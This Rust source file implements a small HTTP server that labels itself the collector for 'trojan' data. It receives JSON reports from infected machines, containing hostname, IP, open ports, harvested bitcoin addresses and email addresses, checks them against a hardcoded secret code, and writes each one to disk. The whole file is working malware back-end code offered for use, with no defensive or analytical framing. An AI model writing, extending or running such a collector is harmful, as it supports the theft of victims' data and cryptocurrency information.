use serde::{Deserialize, Serialize};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

const ADDR: &str = "127.0.0.1:8080";
const HASH: &str = "i3no2nro32nro2nf43nfe2nf2f@8@N#n3on2";

/// The data we expect from the trojan network request
#[derive(Debug, Serialize, Deserialize)]
struct Data {
    machine_hostname: String,
    machine_ip: i32,
    machine_open_ports: Vec<i32>,
    bitcoin_addresses_found: Vec<String>,
    email_addresses_found: Vec<String>,
    hcode: String,
}

fn read_request_body(stream: &mut TcpStream, content_length: usize) -> std::io::Result<Vec<u8>> {
    let mut buffer = vec![0; content_length];
    stream.read_exact(&mut buffer)?;
    Ok(buffer)
}

fn handle_connection(mut stream: TcpStream) -> std::io::Result<()> {
    // Read the HTTP request headers
    let mut headers = [0; 1024];
    stream.read(&mut headers)?;

    // Convert the headers to a string for easy parsing
    let headers_str = String::from_utf8_lossy(&headers);

    // Find the "Content-Length" header to determine the length of the body
    let content_length = headers_str
        .lines()
        .filter_map(|line| {
            let mut parts = line.split(": ");
            if let (Some(header), Some(value)) = (parts.next(), parts.next()) {
                if header.to_lowercase() == "content-length" {
                    value.parse::<usize>().ok()
                } else {
                    None
                }
            } else {
                None
            }
        })
        .next()
        .unwrap_or(0);

    // Read the body of the request
    let body = read_request_body(&mut stream, content_length)?;

    // Deserialize received data into the Data struct
    let received_data: Data = match serde_json::from_slice(&body) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Error deserializing data: {}", e);
            return Ok(());
        }
    };

    println!("Received data: {:?}", received_data);

    match check_request_permission(&received_data) {
        Ok(permission) => {
            if permission {
                println!("Processing data...");
                if let Err(e) = save_data(received_data) {
                    eprintln!("Error saving data: {}", e);
                } else {
                    stream.write("Ok\n".as_bytes())?;
                }
            } else {
                // do nothing
                println!("Permission not found!")
            }
        }
        Err(e) => {
            eprintln!("Error checking permission: {}", e);
        }
    }

    Ok(())
}

// Check if the request is authorized
fn check_request_permission(data: &Data) -> std::io::Result<bool> {
    Ok(data.hcode == HASH)
}

// Save our trojan data to the server file system
fn save_data(data: Data) -> std::io::Result<()> {
    std::fs::create_dir_all("./data")?;

    let timestamp = chrono::Utc::now().timestamp();
    let filename = format!("./data/data_{}.json", timestamp);

    let serialized_data: String = serde_json::to_string(&data)?;

    // Write the JSON data to the file
    std::fs::write(filename, serialized_data)?;

    println!("Data saved to disk successfully.");

    Ok(())
}

fn main() -> std::io::Result<()> {
    let listener = TcpListener::bind(ADDR)?;

    println!("Running server on port 8080");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_connection(stream)?;
            }
            Err(e) => {
                panic!("{}", e)
            }
        }
    }

    Ok(())
}
